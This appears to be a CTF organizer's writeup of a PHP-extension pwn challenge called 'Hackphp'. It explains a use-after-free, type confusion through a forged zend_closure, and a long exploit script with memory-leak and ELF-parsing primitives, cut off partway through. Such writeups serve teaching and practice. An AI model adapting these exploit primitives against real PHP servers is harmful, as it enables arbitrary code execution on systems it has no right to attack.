Writeups</span></h1><p>Every single member of us played an important role in this game, which made the competition an outstanding and widely acclaimed one. But in the process of the game, there were many problems in the deployment environment of the challenge and the challenge itself, which caused a lot of troubles for the participating teams. Sometimes we got unexpected solutions, and those are much different from the solutions we expected…</p><p>After collecting the writeups of the top ranked teams, I carefully checked them and learned a lot of new ideas. At the same time, I realized the shortcomings of the challenges. Here are my opinions about several challenges.</p><h3><span id="hackphp">Hackphp</span></h3><h4><span id="preview">Preview</span></h4><p>An easy <code>php pwn</code> challenge. This challenge is designed for challengers to use the vulnerability in <code>php extension</code> to execute arbitrary code.</p><p>Check <code>hackphp.so</code> carefully, and we can find the functions listed below: </p><ul><li><code>hackphp_create</code>, creates a buffer with the length of <code>size</code>, and stores the <code>buffer pointer</code> in <code>buf</code> </li><li><code>hackphp_delete</code>, use <code>efree</code> to release <code>buf</code> and reset it to <code>null</code></li><li><code>hackphp_edit</code>, edit the buffer memory pointed by <code>buf</code></li><li><code>hackphp_get</code>, get the content of memory pointed by <code>buf</code></li></ul><p>And here we get the vulnerability in <code>hackphp_create</code>:</p><blockquote><p>If we try to create a buffer with <code>size &lt; 0x100 || size &gt; 0x200</code>, then <code>efree(buf)</code> will be execute but <code>buf</code> will not be resetted to <code>null</code>, which caused a traditional <code>UAF</code> problem. </p></blockquote><p>And now it’s pretty easy, because they (objects defined in <code>.php</code> source and <code>buf</code>) share the same heap memory, we can use the vulnerability to make an object and a buffer been allocated at the same place (make sure that the size of the object and the buffer should be the same). At last we can reach <code>/readflag</code> by <code>type-confusion</code>.</p><h4><span id="type-confusion-in-php">Type-confusion in PHP</span></h4><p>How should we use <code>type-confusion</code> in <code>PHP</code>? Let’s check it out.</p><p><strong>demo.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$obj</span> = <span class="keyword">new</span> myClass();</span><br><span class="line">    <span class="variable">$obj</span>-&gt;<span class="variable">$a</span> = &#123;&#125;;</span><br><span class="line">    <span class="variable">$obj</span>-&gt;<span class="variable">$b</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$x</span></span>) </span>&#123;&#125;;</span><br><span class="line">    <span class="variable">$obj</span>-&gt;<span class="variable">$c</span> = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    <span class="variable">$obj</span>-&gt;<span class="variable">$d</span> = <span class="number">1.111111</span>;</span><br><span class="line">    var_dump(<span class="variable">$obj</span>);</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>To figure out the memory layout of <code>$obj</code>, we can set breakpoint like this:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> b php_var_dump</span></span><br><span class="line">Breakpoint 1 at 0x4055c0: file /home/supergate/php-src/ext/standard/var.c, line 93.</span><br></pre></td></tr></table></figure><p>Run <code>php demo.php</code>, and we can get:</p><p><img src="php_var_dump.png"></p><p>We should understand that <code>zval *struc</code> points to the memory space of <code>$obj</code>. PHP variables are stored by <code>zval</code>, and here we can try out to look at the memory layout:</p><p><img src="memory_layout.png"></p><p>The type of variable is defined by <code>zval-&gt;v-&gt;type</code>, whose related information is mentioned in <code>zend_types.h</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment">/* regular data types */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_UNDEF0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_NULL1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_FALSE2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_TRUE3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_LONG4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_DOUBLE5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_STRING6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_ARRAY7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_OBJECT8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_RESOURCE9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_REFERENCE10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* constant expressions */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_CONSTANT_AST11</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* internal types */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_INDIRECT             13</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_PTR14</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_ALIAS_PTR15</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IS_ERROR15</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* fake types used only for type hinting (Z_TYPE(zv) can not use them) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IS_BOOL16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_CALLABLE17</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_ITERABLE18</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_VOID19</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IS_NUMBER20</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>We can see that the type of <code>$obj</code> is <code>object</code>.<br>Let’s look deeper into <code>$obj</code>:</p><p><img src="hex_obj.png"></p><p>The contents from <code>0x7ffff587d028</code> to <code>0x7ffff587d060</code> are the properties of <code>$obj</code>. And we should notice that <code>0x7ffff585c500</code> is the pointer to <code>$obj-&gt;b</code>, which is a <code>Anonymous function</code>, and in PHP kernel, <code>Anonymous function</code> is represented by <code>zend_closure</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_closure</span> &#123;</span></span><br><span class="line">zend_object       <span class="built_in">std</span>;</span><br><span class="line">zend_function     func;</span><br><span class="line">zval              this_ptr;</span><br><span class="line">zend_class_entry *called_scope;</span><br><span class="line">zif_handler       orig_internal_handler;</span><br><span class="line">&#125; zend_closure;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> _<span class="title">zend_function</span> &#123;</span></span><br><span class="line">zend_uchar type;<span class="comment">/* MUST be the first element of this struct! */</span></span><br><span class="line"><span class="keyword">uint32_t</span>   quick_arg_flags;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">zend_uchar type;  <span class="comment">/* never used */</span></span><br><span class="line">zend_uchar arg_flags[<span class="number">3</span>]; <span class="comment">/* bitset of arg_info.pass_by_reference */</span></span><br><span class="line"><span class="keyword">uint32_t</span> fn_flags;</span><br><span class="line">zend_string *function_name;</span><br><span class="line">zend_class_entry *scope;</span><br><span class="line">zend_function *prototype;</span><br><span class="line"><span class="keyword">uint32_t</span> num_args;</span><br><span class="line"><span class="keyword">uint32_t</span> required_num_args;</span><br><span class="line">zend_arg_info *arg_info;</span><br><span class="line">&#125; common;</span><br><span class="line"></span><br><span class="line">zend_op_array op_array;</span><br><span class="line">zend_internal_function internal_function; <span class="comment">// our target</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>In order to execute malicious function, we should replace <code>internal_function</code> to the address of the function. At the same time, we should ensure the integrity of <code>zend_closure</code>, otherwise the program will crash.</p><p>Because of the <code>UAF</code> problem, we can control the data from <code>0x7ffff587d000</code> to <code>0x7ffff587d070</code> which leads to a fake object generated. And if we can forge a <code>zend_closure</code> structure, we almost complete the challenge.</p><h4><span id="details">Details</span></h4><p>The use of <code>hackphp.so</code> makes challengers able to modify <code>.got</code> to hijack function, but considering a more common circumstance, I would like to share a way to execute <code>/readflag</code> by forging fake <code>closure</code>.</p><p>The idea is very similar to <a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">this exp</a>, some template functions can be used directly, but the question is only specific size of the buffer can be controlled in this challenge, and it is impossible to read and write to the next heap block out of boundary. This brings us trouble in constructing <code>zend_closure</code>.</p><p>The solution is to apply for a string type object again (the length must be 0x130 to hold the <code>zend_closure</code> content), which is filled with characteristic values, and then the address of the object is found through the constructed leak primitive, and then a closure can be faked, and finally Use <code>UAF</code> to modify the closure to the forged address.</p><h4><span id="exp">exp</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">global</span> <span class="variable">$obj</span>, <span class="variable">$origin_object</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span><span class="number">-1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">        <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">        <span class="variable">$address</span> |= ord(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$out</span> .= chr(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ljust</span>(<span class="params"><span class="variable">$s</span>, <span class="variable">$len</span>=<span class="number">8</span>, <span class="variable">$pad</span>=<span class="number">0</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$out</span> = <span class="variable">$s</span>;</span><br><span class="line">    <span class="variable">$curlen</span> = strlen(<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="variable">$curlen</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$out</span> .= chr(<span class="variable">$pad</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">basic_leak</span>(<span class="params"><span class="variable">$origin</span>, <span class="variable">$offset</span>=<span class="number">0</span>, <span class="variable">$len</span>=<span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$arg</span> = substr(<span class="variable">$origin</span>, <span class="variable">$offset</span>, <span class="variable">$len</span>);</span><br><span class="line">    <span class="keyword">return</span> str2ptr(<span class="variable">$arg</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leak_origin_object_content</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    hackphp_edit(str_repeat(<span class="string">&quot;a&quot;</span>, <span class="number">16</span>));</span><br><span class="line">    <span class="variable">$leak_base_heap</span> = hackphp_get();</span><br><span class="line"></span><br><span class="line">    hackphp_edit(str_repeat(<span class="string">&quot;a&quot;</span>, <span class="number">24</span>));</span><br><span class="line">    <span class="variable">$leak_elf</span> = hackphp_get();</span><br><span class="line"></span><br><span class="line">    hackphp_edit(str_repeat(<span class="string">&quot;a&quot;</span>, <span class="number">40</span>));</span><br><span class="line">    <span class="variable">$leak_aaa</span> = hackphp_get();</span><br><span class="line"></span><br><span class="line">    hackphp_edit(str_repeat(<span class="string">&quot;a&quot;</span>, <span class="number">56</span>));</span><br><span class="line">    <span class="variable">$leak_bbb</span> = hackphp_get();</span><br><span class="line"></span><br><span class="line">    hackphp_edit(str_repeat(<span class="string">&quot;a&quot;</span>, <span class="number">112</span>));</span><br><span class="line">    <span class="variable">$leak_next_heap</span> = hackphp_get();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= ptr2str(<span class="number">0xc000041800000002</span>);</span><br><span class="line">    <span class="variable">$out</span> .= ptr2str(<span class="number">0x0000000000000001</span>);</span><br><span class="line">    <span class="variable">$out</span> .= ljust(substr(<span class="variable">$leak_base_heap</span>, <span class="number">-6</span>, <span class="number">6</span>));</span><br><span class="line">    <span class="variable">$out</span> .= ljust(substr(<span class="variable">$leak_elf</span>, <span class="number">-6</span>, <span class="number">6</span>));</span><br><span class="line">    <span class="variable">$out</span> .= ljust(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="variable">$out</span> .= ljust(substr(<span class="variable">$leak_aaa</span>, <span class="number">-6</span>, <span class="number">6</span>));</span><br><span class="line">    <span class="variable">$out</span> .= ptr2str(<span class="number">0x6</span>);</span><br><span class="line">    <span class="variable">$out</span> .= ljust(substr(<span class="variable">$leak_bbb</span>, <span class="number">-6</span>, <span class="number">6</span>));</span><br><span class="line">    <span class="variable">$out</span> .= ptr2str(<span class="number">0x308</span>);</span><br><span class="line">    <span class="variable">$out</span> .= ptr2str(<span class="number">0xdeadbeef</span>);</span><br><span class="line">    <span class="variable">$out</span> .= ptr2str(<span class="number">0x4</span>);</span><br><span class="line">    <span class="variable">$out</span> .= ptr2str(<span class="number">0x3ff1c71c717ac192</span>);</span><br><span class="line">    <span class="variable">$out</span> .= ptr2str(<span class="number">0x5</span>);</span><br><span class="line">    <span class="variable">$out</span> .= ljust(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="variable">$out</span> .= ljust(substr(<span class="variable">$leak_next_heap</span>, <span class="number">-6</span>, <span class="number">6</span>));</span><br><span class="line">    hackphp_edit(<span class="variable">$out</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$origin</span>, <span class="variable">$offset</span>, <span class="variable">$value</span>, <span class="variable">$len</span>=<span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$origin</span>[<span class="variable">$offset</span> + <span class="variable">$i</span>] = chr(<span class="variable">$value</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="variable">$value</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    hackphp_edit(<span class="variable">$origin</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">super_leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$offset</span>=<span class="number">0</span>, <span class="variable">$len</span>=<span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$obj</span>, <span class="variable">$origin_object</span>;</span><br><span class="line">    write(<span class="variable">$origin_object</span>, <span class="number">0x60</span>, <span class="variable">$addr</span> + <span class="variable">$offset</span> - <span class="number">0x10</span>);</span><br><span class="line">    <span class="variable">$leak</span> = strlen(<span class="variable">$obj</span>-&gt;aaa);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$len</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$len</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$e_type</span> = super_leak(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$e_phoff</span> = super_leak(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">    <span class="variable">$e_phentsize</span> = super_leak(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="variable">$e_phnum</span> = super_leak(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">        <span class="variable">$p_type</span>  = super_leak(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">        <span class="variable">$p_flags</span> = super_leak(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">        <span class="variable">$p_vaddr</span> = super_leak(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$p_memsz</span> = super_leak(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">            <span class="comment"># handle pie</span></span><br><span class="line">            <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">            <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">            <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$leak</span> = super_leak(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">            <span class="variable">$deref</span> = super_leak(<span class="variable">$leak</span>);</span><br><span class="line">            <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$leak</span> = super_leak(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">            <span class="variable">$deref</span> = super_leak(<span class="variable">$leak</span>);</span><br><span class="line">            <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span 